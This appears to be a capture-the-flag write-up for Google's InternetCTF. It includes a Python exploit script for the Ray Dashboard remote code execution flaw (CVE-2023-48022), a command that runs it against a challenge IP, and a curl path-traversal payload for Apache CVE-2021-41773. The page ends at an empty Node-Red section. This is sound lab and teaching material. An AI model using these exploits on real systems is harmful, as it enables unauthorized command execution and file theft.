---
description: https://capturetheflag.withgoogle.com/internet
---

# Google InternetCTF

This page contains mic check and known vulns.

## Mic Check

```
tap tap tap Is this thing on? Here's a flag CTF{welcome_internetctf}
```

## Exposed Ray Dashboard (known rce)

Read more about  CVE-2023-48022 at : [https://www.vicarius.io/vsociety/posts/the-story-of-shadowray-cve-2023-48022](https://www.vicarius.io/vsociety/posts/the-story-of-shadowray-cve-2023-48022)

Modified `exploit.py`

```python
import argparse
import time
import os
import ray
from ray.job_submission import JobSubmissionClient, JobStatus
import re
import sys

# Function to submit a job to the Ray cluster
def submit_job(host, cmd):
    client = JobSubmissionClient(f"{host}")
    job_id = client.submit_job(
        entrypoint=f"{cmd}",
        runtime_env={"working_dir": "./"}
    )
    print(f"Submitted job ID: {job_id}")
    return client, job_id

# Wait for a job to reach a specified status or timeout
def wait_until_status(client, job_id, status_to_wait_for, timeout_seconds=300):
    start = time.time()
    while time.time() - start <= timeout_seconds:
        status = client.get_job_status(job_id)
        print(f"Status: {status}")
        if status in status_to_wait_for:
            break
        time.sleep(1)

# Check if the host matches the required format
def validate_host_format(host):
    if not re.match(r'^https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$', host):
        print("Error: Host must be in the format 'http(s)://<ip>:<port>'.")
        sys.exit(1)
        
if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Submit a job to Ray cluster with dynamic host and command execution.")
    parser.add_argument("--host", type=str, required=True, help="The host address of the Ray cluster head node. Format: http(s)://<ip>:<port>")
    parser.add_argument("--cmd", type=str, required=True, help="The command to be executed on the Ray cluster.")
    args = parser.parse_args()
    validate_host_format(args.host)

    client, job_id = submit_job(args.host, args.cmd)

    wait_until_status(client, job_id, {JobStatus.SUCCEEDED, JobStatus.STOPPED, JobStatus.FAILED})

    # Retrieve and print logs from the job
    logs = client.get_job_logs(job_id)
    print(logs)
```

get the ip of the hosted url using `dig`

```sh
 python3 exploit.py --host http://34.147.80.1:1337 --cmd 'cat /flag/flag.txt'
```

## Apache CVE-2021-41773 (path traversal)

Read more about CVE-2021-41773 at : [https://www.hackthebox.com/blog/cve-2021-41773-explained](https://www.hackthebox.com/blog/cve-2021-41773-explained)

{% code overflow="wrap" %}
```sh
curl http://chal-apache.internet-ctf.kctf.cloud:1337/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag/flag.txt
```
{% endcode %}

## Node-Red Exposed UI (known rce)
